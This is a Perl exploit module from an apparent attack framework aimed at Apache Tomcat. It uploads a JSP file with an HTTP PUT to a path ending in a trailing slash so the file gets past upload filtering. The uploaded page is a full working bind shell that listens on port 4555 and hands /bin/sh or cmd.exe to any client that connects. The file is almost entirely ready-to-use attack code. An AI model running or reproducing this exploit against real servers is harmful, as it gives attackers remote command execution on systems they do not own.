package MSFPerlExploits::TOMCAT::MSF::JspUploadBypass;
use parent qw(P1rK3r::Exploit P1rK3r::Services::TOMCAT);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "JspUploadBypass";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'JspUploadBypass',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'PUT',
                        PATH         => 'sOLaHgqwuF.jsp/',
                        PAYLOAD      => '<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream pj;
    OutputStream mx;

    StreamConnector( InputStream pj, OutputStream mx )
    {
      this.pj = pj;
      this.mx = mx;
    }

    public void run()
    {
      BufferedReader sd  = null;
      BufferedWriter ybl = null;
      try
      {
        sd  = new BufferedReader( new InputStreamReader( this.pj ) );
        ybl = new BufferedWriter( new OutputStreamWriter( this.mx ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = sd.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ybl.write( buffer, 0, length );
          ybl.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( sd != null )
          sd.close();
        if( ybl != null )
          ybl.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    ServerSocket server_socket = new ServerSocket( 4555 );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
',
                        TEXT         => 'Sending First Exploit Request On : /sOLaHgqwuF.jsp/',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;